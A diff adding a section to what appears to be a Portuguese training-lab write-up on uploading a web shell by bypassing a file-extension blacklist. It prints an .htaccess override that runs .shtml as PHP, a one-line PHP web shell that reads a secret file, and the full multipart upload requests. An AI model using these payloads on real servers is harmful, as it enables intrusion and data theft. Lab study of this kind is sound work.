@@ -160,4 +160,54 @@ D3cLNSSIkUUvvKdxO0LsCy8ryg6CxhH7
 
 `Flag: XkJTTpCMVsexpPb2EkLhZpRnuIhc7D1h`
 
-### >> 4. 
+### >> 4. Web shell upload via extension blacklist bypass
+
+Crie um arquivo .htaccess com permissao de execucao php para shtml
+````apache
+<Files *.shtml>
+ForceType application/x-httpd-php
+</Files>
+````
+
+Crie um arquivo webshell
+````php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+````
+
+````htttp
+------WebKitFormBoundarye3lspOAogkMjAhO7
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: application/octet-stream
+
+<Files *.shtml>
+ForceType application/x-httpd-php
+</Files>
+------WebKitFormBoundarye3lspOAogkMjAhO7
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundarye3lspOAogkMjAhO7
+Content-Disposition: form-data; name="csrf"
+
+t4wvyamnWaFWHez4TJd9SQxZUXxYSLI6
+------WebKitFormBoundarye3lspOAogkMjAhO7--
+````
+
+````http
+------WebKitFormBoundaryid3hJcJV3tX9G7VB
+Content-Disposition: form-data; name="avatar"; filename="webshell.shtml"
+Content-Type: image/png
+
+ <?php echo file_get_contents('/home/carlos/secret'); ?> 
+------WebKitFormBoundaryid3hJcJV3tX9G7VB
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryid3hJcJV3tX9G7VB
+Content-Disposition: form-data; name="csrf"
+
+t4wvyamnWaFWHez4TJd9SQxZUXxYSLI6
+------WebKitFormBoundaryid3hJcJV3tX9G7VB--
+````
+
+### >> 5. 
